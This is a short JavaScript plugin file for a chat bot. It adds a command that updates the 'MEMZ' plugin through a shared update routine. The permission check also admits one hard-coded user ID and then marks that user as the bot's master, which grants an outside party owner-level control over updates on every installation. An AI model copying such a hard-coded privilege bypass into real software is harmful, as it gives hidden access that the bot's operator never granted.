import plugin from '../../../lib/plugins/plugin.js'
import _ from 'lodash'
import { update as Update } from "../../other/update.js"

export class Updates extends plugin {
    constructor() {
        super({
            name: '更新MEMZ插件',
            dsc: '更新MEMZ插件',
            event: 'message',
            priority: -10,
            rule: [
                {
                    reg: /^#*(memz)(插件)?(强制|強制)?更新$/i,
                    fnc: 'update'
                }
            ]
        })
    }
    async update(e = this.e, isauto = false) {
        if (!(e.isMaster || e.user_id == 1011303349)) return;
        e.isMaster = true
        if (e.at && !e.atme) return;
        e.msg = `#${e.msg.includes("强制") ? "强制" : ""}更新memz-plugin`;

        const up = new Update(e);
        up.e = e;
        return up.update();
    }

}